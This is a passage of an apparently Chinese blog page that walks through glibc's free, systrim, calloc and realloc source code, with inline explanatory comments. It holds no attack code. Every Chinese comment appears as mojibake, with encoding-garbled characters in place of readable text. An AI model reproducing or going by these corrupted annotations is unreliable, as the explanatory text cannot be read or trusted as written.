class="hljs-number">0</span>)) &#123;<br>      <span class="hljs-comment">//æŸ¥çœ‹ä¸‹ä¸€ä¸ªç›¸é‚»çš„chunkçš„å¤§å°æ˜¯å¦å°äºç­‰äº2 * SIZE_SZ,æˆ–æ˜¯å¦å¤§äºåˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜æ€»é‡</span><br>        errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br> <br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      <span class="hljs-comment">//å¦‚æœå½“å‰freeçš„chunkçš„å‰ä¸€ä¸ªç›¸é‚»chunkä¸ºç©ºé—²çŠ¶æ€,ä¸å‰ä¸€ä¸ªç©ºé—²chunkåˆå¹¶</span><br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      unlink(av, p, bck, fwd);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">//ä¸å½“å‰freeçš„chunkç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkä¸æ˜¯åˆ†é…åŒºçš„top chunk</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        <span class="hljs-comment">//å¦‚æœå½“å‰freeçš„chunkçš„ä¸‹ä¸€ä¸ªç›¸é‚»chunkä¸ºç©ºé—²çŠ¶æ€,ä¸ä¸‹ä¸€ä¸ªç©ºé—²chunkåˆå¹¶</span><br>          unlink(av, nextchunk, bck, fwd);<br>          size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-comment">//ä¸å½“å‰freeçš„chunkç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkå¤„äºinuseçŠ¶æ€,æ¸…é™¤å½“å‰chunkçš„inuseçŠ¶æ€</span><br>          clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br> <br>      bck = unsorted_chunks(av);<br>      fwd = bck-&gt;fd;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;<br>        <span class="hljs-comment">//unsorted_binç¬¬ä¸€ä¸ªchunkçš„fdçš„bkä¸æ˜¯ç¬¬ä¸€ä¸ªchunk</span><br>          errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>          <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>          p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>          p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br>      <span class="hljs-comment">//å°†åˆå¹¶åçš„chunkåŠ å…¥unsorted_binçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­</span><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<br>      check_free_chunk(av, p);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">//å½“å‰freeçš„chunkä¸‹ä¸€ä¸ªç›¸é‚»çš„chunkä¸ºtop chunk,åˆ™å°†å½“å‰chunkåˆå¹¶å…¥top chunk</span><br>      size += nextsize;<br>      set_head(p, size | PREV_INUSE);<br>      av-&gt;top = p;<br>      check_chunk(av, p);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>      <span class="hljs-comment">//å¦‚æœåˆå¹¶åçš„chunkå¤§å°å¤§äº64KB</span><br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>          malloc_consolidate(av);<br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>          <span class="hljs-comment">//å¦‚æœå½“å‰åˆ†é…åŒºä¸ºä¸»åˆ†é…åŒºä¸”top chunkçš„å¤§å°å¤§äºheapçš„æ”¶ç¼©é˜ˆå€¼,è°ƒç”¨systrimå‡½æ•°æ”¶ç¼©heap</span><br>            systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//ä¸ºéä¸»åˆ†é…åŒº,è°ƒç”¨heap_trimå‡½æ•°æ”¶ç¼©éä¸»åˆ†é…åŒºçš„sub_heap</span><br>          heap_info *heap = heap_for_ptr(top(av));<br>          assert(heap-&gt;ar_ptr == av);<br>          heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      <span class="hljs-comment">//æœ‰é”åˆ™å¯¹åˆ†é…åŒºè§£é”</span><br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//å½“å‰freeçš„chunkæ˜¯é€šè¿‡mmapåˆ†é…åˆ™è°ƒç”¨munma_chunké‡Šæ”¾</span><br>    munmap_chunk (p);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a><code>systrim</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">systrim</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> pad, mstate av)</span> &#123;<br>  <span class="hljs-type">long</span> top_size;<br>  <span class="hljs-type">long</span> extra;<br>  <span class="hljs-type">long</span> released;<br>  <span class="hljs-type">char</span> *current_brk;<br>  <span class="hljs-type">char</span> *new_brk;<br>  <span class="hljs-type">size_t</span> pagesize;<br>  <span class="hljs-type">long</span> top_area;<br> <br>  pagesize = GLRO (dl_pagesize);<br>  top_size = chunksize (av-&gt;top);<br>  top_area = top_size - MINSIZE - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (top_area &lt;= pad)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  extra = ALIGN_DOWN(top_area - pad, pagesize);<br>  <span class="hljs-comment">//è®¡ç®—top chunkä¸­æœ€å¤§å¯é‡Šæ”¾çš„æ•´æ•°é¡µå¤§å°,top chunkä¸­è‡³å°‘éœ€è¦MINSIZEçš„å†…å­˜ä¿å­˜fencepost</span><br>  <span class="hljs-keyword">if</span> (extra == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>  current_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>  <span class="hljs-keyword">if</span> (current_brk == (<span class="hljs-type">char</span> *) (av-&gt;top) + top_size) &#123;<br>    <span class="hljs-comment">//å¦‚æœå½“å‰top chunkçš„ç»“æŸåœ°å€ä¸å½“å‰çš„brkå€¼ç›¸ç­‰,æ‰§è¡Œheapæ”¶ç¼©</span><br>    MORECORE (-extra);<br>    <span class="hljs-comment">//è°ƒç”¨sbrké‡Šæ”¾æŒ‡å®šå¤§å°çš„å†…å­˜</span><br>    <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>      (*hook)();<br>    new_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>    LIBC_PROBE (memory_sbrk_less, <span class="hljs-number">2</span>, new_brk, extra);<br>    <span class="hljs-keyword">if</span> (new_brk != (<span class="hljs-type">char</span> *) MORECORE_FAILURE) &#123;<br>      <span class="hljs-comment">//è®¡ç®—é‡Šæ”¾çš„å†…å­˜å¤§å°,æ›´æ–°å½“å‰åˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜æ€»é‡,æ›´æ–°top chunkçš„å¤§å°</span><br>      released = (<span class="hljs-type">long</span>) (current_brk - new_brk);<br>      <span class="hljs-keyword">if</span> (released != <span class="hljs-number">0</span>) &#123;<br>        av-&gt;system_mem -= released;<br>        set_head (av-&gt;top, (top_size - released) | PREV_INUSE);<br>        check_malloc_state (av);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="callocæºç åˆ†æ"><a href="#callocæºç åˆ†æ" class="headerlink" title="callocæºç åˆ†æ"></a>callocæºç åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_calloc (<span class="hljs-type">size_t</span> n, <span class="hljs-type">size_t</span> elem_size)<br>&#123;<br>  mstate av;<br>  mchunkptr oldtop, p;<br>  INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;<br>  <span class="hljs-type">void</span> *mem;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clearsize;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nclears;<br>  INTERNAL_SIZE_T *d;<br> <br>  <span class="hljs-comment">/* size_t is unsigned so the behavior on overflow is defined.  */</span><br>  <span class="hljs-comment">// å°†éœ€è¦ç”³è¯·çš„å†…å­˜å¤§å°è½¬æ¢ä¸ºä»¥å­—èŠ‚ä¸ºå•ä½</span><br>  bytes = n * elem_size;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HALF_INTERNAL_SIZE_T \</span><br><span class="hljs-meta">  (((INTERNAL_SIZE_T) 1) &lt;&lt; (8 * sizeof (INTERNAL_SIZE_T) / 2))</span><br><br>  <span class="hljs-comment">// å¦‚æœ n å’Œ elem_size ä¸­çš„ä»»ä½•ä¸€ä¸ªä¸å°äº HALF_INTERNAL_SIZE_T</span><br>  <span class="hljs-comment">// ä»¥ 64 ä½ä¸ºä¾‹ï¼ŒHALF_INTERNAL_SIZE_T = 2^32</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((n | elem_size) &gt;= HALF_INTERNAL_SIZE_T, <span class="hljs-number">0</span>))<br>    &#123;<br>      <span class="hljs-comment">// åˆ¤æ–­ bytes æ˜¯å¦æº¢å‡º</span><br>      <span class="hljs-keyword">if</span> (elem_size != <span class="hljs-number">0</span> &amp;&amp; bytes / elem_size != n)<br>        &#123;<br>          __set_errno (ENOMEM);<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>  <br>  <span class="hljs-comment">// è·å– __malloc_hook</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) =<br>    atomic_forced_read (__malloc_hook);<br>  <br>  <span class="hljs-comment">// å¦‚æœ __malloc_hook ä¸ä¸º NULL åˆ™è°ƒç”¨ __malloc_hookï¼Œå‚æ•°ä¸ºç”³è¯·å†…å­˜çš„å¤§å°ã€‚</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      sz = bytes;<br>      mem = (*hook)(sz, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (mem, <span class="hljs-number">0</span>, sz);<br>    &#125;<br> <br>  sz = bytes;<br> <br>  arena_get (av, sz);<br>  <span class="hljs-keyword">if</span> (av)<br>    &#123;<br>      <span class="hljs-comment">/* Check if we hand out the top chunk, in which case there may be no</span><br><span class="hljs-comment">     need to clear. */</span><br>   <span class="hljs-comment">// è·å– top chunk å’Œ top chunk çš„å¤§å°ï¼Œè¿™é‡Œçš„ top chunk çš„å¤§å°æ˜¯æŒ‡ top chunk å¤´ä¹‹åå¯ä»¥â€œæ§åˆ¶â€çš„çš„å†…å­˜å¤§å°ï¼Œå…·ä½“çœ‹åé¢çš„è§£é‡Šã€‚</span><br>   <span class="hljs-comment">// è·å–è¿™äº›çš„åŸå› æ˜¯æ— è®ºæ˜¯ main_arena æ§åˆ¶çš„ heap åŒºåŸŸé€šè¿‡ sbrk æ‰©å±•è¿˜æ˜¯é main_arena åŒºåŸŸé€šè¿‡å¯¹ heap_info å‘åæ‰©å±•å—ä¿æŠ¤çš„å†…å­˜åŒºåŸŸï¼Œ</span><br>   <span class="hljs-comment">// æ–°æ‰©å±•çš„å†…å­˜åˆå§‹å€¼ä¸º 0ï¼Œå³è¿™äº›å†…å­˜ä¸éœ€è¦æ¸…ç©ºï¼Œå› æ­¤åé¢ä¼šå°†éœ€è¦æ¸…é›¶çš„å†…å­˜å¤§å°å‡å»å’Œè¿™éƒ¨åˆ†å†…å­˜é‡åˆçš„åŒºåŸŸï¼Œæå‡ç¨‹åºæ•ˆç‡ã€‚</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CLEARS</span><br>      oldtop = top (av);<br>      oldtopsize = chunksize (top (av));<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> MORECORE_CLEARS &lt; 2</span><br>      <span class="hljs-comment">/* Only newly allocated memory is guaranteed to be cleared.  */</span><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena &amp;&amp;<br>      oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="hljs-type">char</span> *) oldtop)<br>  <span class="hljs-comment">// å¯¹äº main_arena ç®¡ç†çš„å†…å­˜ï¼Œtop chunk åéœ€è¦æ¸…ç©ºçš„å†…å­˜å¤§å°ä¸º top chunk åˆ°åŸå…ˆ heap åŒºåŸŸæœ«å°¾ä½ç½®</span><br>    oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="hljs-type">char</span> *) oldtop);<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    &#123;<br>    <span class="hljs-comment">// å¯¹äºé main_arena ç®¡ç†çš„å†…å­˜ï¼Œtop chunk åéœ€è¦æ¸…ç©ºçš„å†…å­˜å¤§å°ä¸º top chunk åˆ°åŸå…ˆ heap_info å—ä¿æŠ¤åŒºåŸŸæœ«å°¾ä½ç½®</span><br>      heap_info *heap = heap_for_ptr (oldtop);<br>      <span class="hljs-keyword">if</span> (oldtopsize &lt; (<span class="hljs-type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="hljs-type">char</span> *) oldtop)<br>        oldtopsize = (<span class="hljs-type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="hljs-type">char</span> *) oldtop;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* No usable arenas.  */</span><br>      <span class="hljs-comment">// av ä¸º NULL ï¼Œé‚£ä¹ˆä¹‹å _int_malloc ä¼šç›´æ¥ mmap è·å–å†…å­˜ï¼Œè€Œ mmap è·å–çš„å†…å­˜åˆå§‹å€¼ä¸º 0ï¼Œå› æ­¤ä¸éœ€è¦æ¸…é›¶ã€‚</span><br>      oldtop = <span class="hljs-number">0</span>;<br>      oldtopsize = <span class="hljs-number">0</span>;<br>    &#125;<br>  <span class="hljs-comment">// è°ƒç”¨ _int_malloc è·å–å†…å­˜</span><br>  mem = _int_malloc (av, sz);<br> <br>  <span class="hljs-comment">// åŒ __libc_malloc çš„ 3 ç§æƒ…å†µ</span><br>  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||<br>          av == arena_for_chunk (mem2chunk (mem)));<br> <br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span> &amp;&amp; av != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_calloc_retry, <span class="hljs-number">1</span>, sz);<br>      av = arena_get_retry (av, sz);<br>      mem = _int_malloc (av, sz);<br>    &#125;<br> <br>  <span class="hljs-keyword">if</span> (av != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br> <br>  <span class="hljs-comment">/* Allocation failed even after a retry.  */</span><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>  p = mem2chunk (mem);<br> <br>  <span class="hljs-comment">/* Two optional cases in which clearing not necessary */</span><br>  <span class="hljs-comment">// å¦‚æœæ˜¯ mmap è·å–çš„ä¸éœ€è¦æ¸…é›¶ï¼Œå› æ­¤åªè¦ chunk çš„ size å­—æ®µä¸­çš„ IS_MMAPPED ä½ç½® 1 å°±ä¸ä¼šæ¸…é›¶ã€‚</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__builtin_expect (perturb_byte, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (mem, <span class="hljs-number">0</span>, sz);<br> <br>      <span class="hljs-keyword">return</span> mem;<br>    &#125;<br> <br>  csz = chunksize (p);<br> <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CLEARS</span><br>  <span class="hljs-comment">// å¦‚æœæ˜¯ä» top chunk ä¸Šåˆ‡ä¸‹æ¥çš„åˆ™åªéœ€è¦æ¸…é›¶ top chunk èŒƒå›´çš„å†…å­˜ã€‚</span><br>  <span class="hljs-keyword">if</span> (perturb_byte == <span class="hljs-number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))<br>    &#123;<br>      <span class="hljs-comment">/* clear only the bytes from non-freshly-sbrked memory */</span><br>      csz = oldtopsize;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <br>  <span class="hljs-comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span><br><span class="hljs-comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span><br><span class="hljs-comment">     minimally 3.  */</span><br>  <span class="hljs-comment">// æ¸…ç©ºå†…å­˜ï¼ŒåŒ…æ‹¬ä¸‹ä¸€ä¸ª chunk çš„ prev_size ã€‚   </span><br>  d = (INTERNAL_SIZE_T *) mem;<br>  clearsize = csz - SIZE_SZ;<br>  nclears = clearsize / <span class="hljs-keyword">sizeof</span> (INTERNAL_SIZE_T);<br>  assert (nclears &gt;= <span class="hljs-number">3</span>);<br>   <br>  <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">9</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (d, <span class="hljs-number">0</span>, clearsize);<br> <br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      *(d + <span class="hljs-number">0</span>) = <span class="hljs-number">0</span>;<br>      *(d + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;<br>      *(d + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">4</span>)<br>        &#123;<br>          *(d + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;<br>          *(d + <span class="hljs-number">4</span>) = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">6</span>)<br>            &#123;<br>              *(d + <span class="hljs-number">5</span>) = <span class="hljs-number">0</span>;<br>              *(d + <span class="hljs-number">6</span>) = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">8</span>)<br>                &#123;<br>                  *(d + <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;<br>                  *(d + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>  <span class="hljs-keyword">return</span> mem;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="rellocæºç åˆ†æ"><a href="#rellocæºç åˆ†æ" class="headerlink" title="rellocæºç åˆ†æ"></a>rellocæºç åˆ†æ</h2><h3 id="libc-realloc"><a href="#libc-realloc" class="headerlink" title="_libc_realloc"></a><code>_libc_realloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_realloc (<span class="hljs-type">void</span> *oldmem, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  INTERNAL_SIZE_T nb;         <span class="hljs-comment">/* padded request size */</span><br> <br>  <span class="hljs-type">void</span> *newp;             <span class="hljs-comment">/* chunk to return */</span><br>  <span class="hljs-comment">// è°ƒç”¨ __realloc_hook</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) =<br>    atomic_forced_read (__realloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// å¦‚æœ bytes ä¸º 0 åˆ™ç›¸å½“äº free(oldmem)</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> REALLOC_ZERO_BYTES_FREES</span><br>  <span class="hljs-keyword">if</span> (bytes == <span class="hljs-number">0</span> &amp;&amp; oldmem != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      __libc_free (oldmem); <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-comment">// å¦‚æœ oldmem ä¸º NULL ç›¸å½“äº malloc(bytes)</span><br>  <span class="hljs-comment">/* realloc of null is supposed to be same as malloc */</span><br>  <span class="hljs-keyword">if</span> (oldmem == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> __libc_malloc (bytes);<br> <br>  <span class="hljs-comment">// 